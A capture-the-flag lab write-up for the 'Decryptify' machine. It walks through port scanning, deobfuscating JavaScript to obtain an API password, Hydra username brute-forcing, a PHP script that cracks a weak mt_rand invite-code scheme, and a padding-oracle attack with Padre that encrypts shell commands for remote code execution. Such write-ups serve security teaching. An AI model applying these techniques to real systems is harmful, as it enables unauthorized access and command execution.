# Decryptify

**Difficulty:** Medium

## Reconnaissance

I started by running a basic nmap scan to reveal open ports:

```bash
nmap -sC -sV -p- -oN nmap.txt decryptify.thm -T4
```

This revealed two open ports:

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 23:02:d4:1a:89:b8:a3:ed:20:ea:82:0d:0d:3e:d4:2b (RSA)
|   256 5a:3b:66:68:29:1a:45:6d:5d:c7:b8:81:96:82:80:15 (ECDSA)
|_  256 3d:e2:0c:1c:f8:f1:85:1b:74:4b:94:a2:19:04:5a:98 (ED25519)
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login - Decryptify
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

Now I fuzzed the web server on port 1337 for additional endpoints:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://decryptify.thm:1337/FUZZ -e .html,.php,.html
```

```
api.php                 [Status: 200]
dashboard.php           [Status: 302]
index.php               [Status: 200]
logs                    [Status: 301]
```

## Initial Access

I started by examining the index page of the web server, which revealed a login page requiring either a username or email along with an invite code. The API page required a password for access. I attempted to fuzz for passwords without success, so I shifted my focus to examining the page sources. On index.php, I discovered a linked file called api.js. The script appeared heavily obfuscated, so I deobfuscated it using deobfuscate.io, which produced the following result:

```javascript
function b(c, d) {
  const e = a();
  return b = function (f, g) {
    f = f - 357;
    let h = e[f];
    return h;
  }, b(c, d);
}
const j = b;
function a() {
  const k = ["16OTYqOr", "861cPVRNJ", "474AnPRwy", "H7gY2tJ9wQzD4rS1", "5228dijopu", "29131EDUYqd", "8756315tjjUKB", "1232020YOKSiQ", "7042671GTNtXE", "1593688UqvBWv", "90209ggCpyY"];
  a = function () {
    return k;
  };
  return a();
}
(function (d, e) {
  const i = b, f = d();
  while (true) {
    try {
      const g = parseInt(i(363)) / 1 + -parseInt(i(367)) / 2 + parseInt(i(359)) / 3 * (parseInt(i(362)) / 4) + parseInt(i(364)) / 5 + parseInt(i(360)) / 6 * (parseInt(i(357)) / 7) + -parseInt(i(358)) / 8 * (parseInt(i(366)) / 9) + parseInt(i(365)) / 10;
      if (g === e) break; else f.push(f.shift());
    } catch (h) {
      f.push(f.shift());
    }
  }
}(a, 934896));
const c = j(361);
```

While this looked complex, the critical component was the final command `c = j(361)`. I tested entering `j(361)` directly into the browser's debugging console, which returned the API password. I successfully used this to access the API endpoint.

```bash
j(361)
REDACTED
```

On the API page, I found documentation for the invite code generation mechanism:

```php
// Token generation example
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);

    return $seed_value;
}
     $seed_value = calculate_seed_value($email, $constant_value);
     mt_srand($seed_value);
     $random = mt_rand();
     $invite_code = base64_encode($random);
```

The system calculates a seed value using a constant value and the user's email, then generates a random number which is base64-encoded to produce the invite code. I adapted this code to generate invite codes by providing an email and constant value. The next step was identifying a valid email address.

Since the login page was verbose and indicated whether users existed, I attempted to bruteforce email addresses with Hydra. While searching through the site, I examined the logs endpoint and discovered that users utilized the domain `fake.thm`. I proceeded to fuzz for usernames within this domain:

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p test decryptify.thm http-post-form "/index.php:invite_username=^USER^@fake.thm&invite_code=^PASS^:does not exist" -VI -T 64 -s 1337 -o users.txt
```

```
[1337][http-post-form] host: decryptify.thm   login: admin   password: test
[1337][http-post-form] host: decryptify.thm   login: hello   password: test
[1337][http-post-form] host: decryptify.thm   login: alpha   password: test
```

I identified a valid user: `hello@fake.thm`. Additionally, in the logs I found the following entry:

```
(Invite created, code: MTM0ODMzNzEyMg== for alpha@fake.thm)
```

When attempting to use this account, I discovered it was deactivated. However, I realized I could reverse the calculation to derive the constant value from the invite code and email. I created a PHP script to brute-force the constant:

```php
<?php  
  
function calculate_seed_value($email, $constant_value) {  
    $email_length = strlen($email); // 15  
    $email_hex = hexdec(substr($email, 0, 8)); // substr is "alpha@fa"  
    $seed_value = hexdec((string)($email_length + $constant_value + $email_hex));  
    return $seed_value;  
}  
  
$email = "alpha@fake.thm";  
$target_invite_code = "MTM0ODMzNzEyMg==";  
    
for ($constant_value = 0; $constant_value < 100000; $constant_value++) {  
    $seed_value = calculate_seed_value($email, $constant_value);  
    mt_srand($seed_value);  
    $random = mt_rand();  
    $invite_code = base64_encode($random);  
  
    if ($invite_code === $target_invite_code) {  
        echo "Found constant value: $constant_value\n";  
        break;  
    }  
}
```

Executing this script revealed the constant value:

```bash
php reverse.php
Found constant value: 99999
```

I used this constant value with the token generator script to produce a valid invite code for `hello@fake.thm`:

```bash
php token_gen.php
Found the token: REDACTED
```

After successfully logging in, I obtained the first flag.

## Padding Oracle Vulnerability Discovery

To achieve remote code execution, I continued exploring the application. In the page source, I discovered a hidden parameter:

```html
<form method="get">
    <input type="hidden" name="date" value="X 8U xyHpSErLpAOO9Wf64BAp8rk 2WoGSuk1GKBljU=">
</form>
```

Adding the `date` parameter to my request with the provided base64-encoded value initially resulted in the following error:

```
Padding error: error:0606506D:digital envelope routines:EVP_DecryptFinal_ex:wrong final block length Decryptify
```

When I removed the value of the `date` parameter entirely, the server responded with the same padding error. This error strongly indicates that the application is decrypting the `date` parameter using a block cipher mode with padding (likely AES in CBC mode), and the decryption failed due to invalid padding. The `EVP_DecryptFinal_ex` function is part of OpenSSL's API, and this type of error typically occurs when ciphertext padding has been tampered with.

This behavior suggests a potential **Padding Oracle vulnerability**, where the server leaks information about whether the padding is correct during decryption. If exploitable, this vulnerability could allow an attacker to decrypt data or encrypt arbitrary values without knowledge of the encryption key.

## Exploiting the Padding Oracle for RCE

To analyze and exploit this padding oracle vulnerability, I utilized a tool called Padre (Padding Oracle Decryption). I provided the encrypted value from the `date` parameter as input:

```bash
./padre -u 'http://decryptify.thm:1337/dashboard.php?date=$' \
  -cookie 'PHPSESSID=SESSION_ID' \
  'ENCRYPTED_VALUE'
```

The decryption revealed:

```
[1/1] date +%Y
```

This output indicates that the application stores the `date` parameter in encrypted format and subsequently uses it as a format string for the Unix `date` command. This discovery confirms that user-controlled input is being executed as a system command, presenting a clear path to remote code execution.

Now that I confirmed the `date` parameter is encrypted and passed to a system command, and that the application is vulnerable to a padding oracle attack, I could encrypt arbitrary commands. To verify command execution, I encrypted `whoami` using Padre:

```bash
./padre -u 'http://decryptify.thm:1337/dashboard.php?date=$' \
  -cookie 'PHPSESSID=SESSION_ID' \
  -enc 'whoami'
```

Padre returned an encrypted value which I injected back into the `date` parameter. The command executed successfully, confirming remote code execution capabilities.

To retrieve the final flag, I crafted a payload to read `/home/ubuntu/flag.txt`:

```bash
./padre -u 'http://decryptify.thm:1337/dashboard.php?date=$' \
  -cookie 'PHPSESSID=SESSION_ID' \
  -enc 'cat /home/ubuntu/flag.txt'
```

The encrypted payload was sent to the server, successfully retrieving the final flag and completing the challenge.
